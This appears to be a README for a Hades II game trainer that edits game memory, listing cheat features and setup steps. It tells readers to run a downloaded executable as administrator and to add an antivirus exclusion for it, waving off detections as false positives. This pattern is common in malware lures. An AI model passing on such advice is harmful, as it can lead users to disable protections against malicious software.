📋 Project Overview

Hades-II-Trainer-X provides game modifications for Hades II. This tool allows players to adjust game variables such as currency, health, and combat cooldowns. The trainer runs alongside the game and sends commands to modify memory values based on your preferences. You maintain full control over which features remain active during your session.

🎮 Included Features

This software includes several modifications to enhance your gaming experience:

  • Currency Manager: Set your gold and resources to specific amounts.
  • Health Modifier: Toggles for permanent health or instant healing.
  • Combat Adjuster: Removes cooldown timers on specific abilities.
  • Damage Multiplier: Allows one-hit kills for faster progression through encounters.
  • Stamina Control: Keeps your character movement fluid by preventing exhaustion.

⚙️ System Requirements

Ensure your computer meets these requirements to run the software correctly:

  • Operating System: Windows 10 or Windows 11.
  • Processor: Intel Core i5 or equivalent AMD processor.
  • Memory: Minimum 8 GB of RAM.
  • Game Version: The tool requires the official release version of Hades II.
  • Permissions: Administrative access may be required to inject commands into the game process.

🚀 Download and Installation

Follow these steps to set up the software on your Windows computer:

  1. Visit the official release page to download the latest version of the trainer.
  2. Locate the ZIP file in your Downloads folder.
  3. Right-click the ZIP file and select Extract All.
  4. Place the extracted folder in a location you can easily access.
  5. Run the executable file inside the folder.

🕹️ How to Use

Once you install the software, use these steps to activate features during gameplay:

  1. Launch the Hades-II-Trainer-X application as an administrator.
  2. Start your game of Hades II.
  3. Switch back to the trainer window.
  4. Enable the cheats you prefer by clicking the corresponding toggle buttons.
  5. Return to the game window. The trainer will apply changes automatically while the game runs.

You can deactivate any feature at any time by returning to the trainer and clicking the toggle button again. If you wish to reset your game to its original state, close both the game and the trainer application. Restarting the game without the trainer ensures that no modifications remain in effect.

🛡️ Safety Information

The code in this repository interacts with memory processes reserved for the game. Because of the nature of memory injection, some antivirus software might flag the application as a false positive. This is common with game utilities.

If you encounter an error during installation, check your antivirus settings and add an exclusion for the trainer file. This action allows the application to communicate with your game client properly. Never download this trainer from third-party websites to ensure the integrity and safety of your files.

💬 Troubleshooting

  • App does not open: Ensure you are running the software on a 64-bit version of Windows.
  • Buttons do not activate: Verify that you are running the trainer with administrator privileges.
  • Game crashes: Disable all mods and ensure the game is updated to the latest version via your launcher.
